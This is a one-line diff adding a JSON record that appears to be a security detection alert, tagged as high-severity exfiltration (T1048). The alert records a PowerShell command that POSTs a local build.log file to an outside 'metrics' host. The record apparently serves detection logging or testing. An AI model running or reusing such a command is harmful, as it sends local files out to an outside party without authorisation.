@@ -1,0 +1,1 @@
+{"timestamp": "2026-10-16T23:57:46+00:00", "rule": "exfil", "level": "high", "computer": "PC", "command": "powershell -c \"Invoke-WebRequest -Uri http://metrics.example.io/collect -Method POST -InFile build.log\"", "techniques": ["T1048"]}
